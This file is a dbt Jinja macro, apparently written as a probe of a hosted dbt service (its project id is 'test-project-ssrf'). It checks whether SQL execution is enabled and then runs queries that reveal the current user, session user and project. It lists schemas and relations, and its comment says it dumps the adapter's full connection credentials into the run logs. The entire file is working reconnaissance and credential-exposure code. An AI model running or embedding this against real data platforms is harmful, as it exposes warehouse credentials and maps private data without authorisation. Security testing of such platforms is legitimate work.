{% macro exec_probe() %}
  {{ log("EXEC_FLAG=" ~ execute, info=True) }}
  
  {% if execute %}
    {{ log("EXECUTE_IS_TRUE - SQL QUERIES WILL RUN", info=True) }}
    
    {# Try run_query to execute arbitrary SQL #}
    {% set results = run_query("SELECT current_user() as u, current_project() as p, session_user() as su") %}
    {% if results %}
      {% for row in results %}
        {{ log("SQL_RESULT: user=" ~ row['u'] ~ " project=" ~ row['p'] ~ " session_user=" ~ row['su'], info=True) }}
      {% endfor %}
    {% endif %}
    
    {# Try to list all datasets/schemas #}
    {% set schemas = adapter.list_schemas("test-project-ssrf") %}
    {{ log("SCHEMAS=" ~ schemas | string, info=True) }}
    
    {# Dump full credentials again during run context #}
    {% set creds = adapter.config.credentials %}
    {{ log("RUN_CREDS=" ~ creds | string, info=True) }}
    
    {# Try to list relations #}
    {% set relations = adapter.list_relations_without_caching(adapter.config.credentials.schema) %}
    {{ log("RELATIONS=" ~ relations | string, info=True) }}
    
  {% else %}
    {{ log("EXECUTE_IS_FALSE - compile only mode", info=True) }}
  {% endif %}
  
{% endmacro %}
